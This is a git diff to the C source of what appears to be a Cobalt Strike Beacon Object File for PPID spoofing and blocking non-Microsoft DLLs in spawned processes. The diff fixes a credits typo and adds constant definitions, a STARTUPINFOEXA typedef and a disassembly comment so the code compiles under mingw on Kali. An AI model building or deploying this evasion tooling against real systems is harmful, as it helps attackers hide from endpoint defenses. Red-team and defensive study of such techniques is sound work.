@@ -1,13 +1,36 @@
 #include <windows.h>
 #include "beacon.h"
 
-// Credit/shootout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
+// Credit/shoutout to: Adam Chester @_xpn_ + @SEKTOR7net + Raphael Mudge
 // Thank you for the amazing work that you've contributed. I would not be able to publish this without your blogs, videos, and awesome content!
 // Main References for PPID Spoofing & blockdll
 // - https://blog.xpnsec.com/protecting-your-malware/
 // - https://blog.cobaltstrike.com/2021/01/13/pushing-back-on-userland-hooks-with-cobalt-strike/
 // - https://institute.sektor7.net/ (Courses)
 // - https://github.com/ajpc500/BOFs 
+
+// Bug Fix (07/20/21) - Compiling issues with on Kali
+// macos compiled fine, but on kali some definitions were not included. Manually defined them here. 
+// Successful compilation on:
+// - Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
+// - x86_64-w64-mingw32-gcc (GCC) 10-win32 20210110
+// Defined in WinBase.h on windows system
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON   0x0000100000000000
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    0x00020000
+/*                              RCX           RDX               R8                            R9      [RSP+0x0]     [RSP+0x8] [RSP+0x10]
+UpdateProcThreadAttribute(si.lpAttributeList,   0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy),    NULL,     NULL);
+00007FF6BF71195A  mov         qword ptr[rsp + 30h], 0
+	00007FF6BF711963  mov         qword ptr[rsp + 28h], 0
+	00007FF6BF71196C  mov         qword ptr[rsp + 20h], 8
+	00007FF6BF711975  lea         r9, [policy]
+	00007FF6BF71197C  mov         r8d, 20007h
+	- R8D = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 20007h = 0x00020007 = DWORD 4 bytes
+*/
+typedef struct _STARTUPINFOEXA {
+    STARTUPINFOA StartupInfo;
+    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
+} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
 
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
@@ -21,7 +44,8 @@ WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
 
 void SpawnProcess(char * peName, DWORD pid){
     // Declare variables/struct
-    STARTUPINFOEX sInfoEx = { sizeof(sInfoEx) };
+    // (07/20/21) - Changed from STARTUPINFOEX -> STARTUPINFOEXA
+    STARTUPINFOEXA sInfoEx = { sizeof(sInfoEx) };
     //   STARTUPINFOEXA - https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
     //   STARTUPINFOA   - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
     //   typedef struct _STARTUPINFOEXA {
